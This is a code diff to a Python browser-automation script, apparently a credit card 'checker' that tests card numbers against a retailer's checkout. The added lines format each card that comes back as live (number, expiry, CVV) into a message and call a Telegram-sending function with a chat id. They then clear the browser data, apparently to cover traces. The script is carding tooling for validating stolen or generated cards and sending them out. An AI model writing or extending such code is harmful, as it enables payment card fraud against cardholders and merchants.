@@ -185,6 +185,18 @@ def livear(cc_namso):
 
     if bot.locate('thanks', click=False) or bot.locate('live', click=False) or bot.locate('survey', click=False):
         print(f'CC: {cc} - Live!')
+
+        content = f"""
+        Everlane Checker: 
+        
+        📬 STATUS: LIVE! ✅
+
+        CC: {cc[0]}
+        EXP: {cc[1]}/{cc[2]}
+        CVV: {cc[3]}
+        """
+
+        telegram('123', '-726102881')
         bot.press_both('ctrl', 'l')
         bot.copypaste('chrome://settings/clearBrowserData')
         bot.press('enter')
@@ -221,8 +233,7 @@ def main():
 if __name__ == '__main__':
 
     try: 
-
-        main() # Arreglos
+        main()
 
     except KeyboardInterrupt:
         exit()
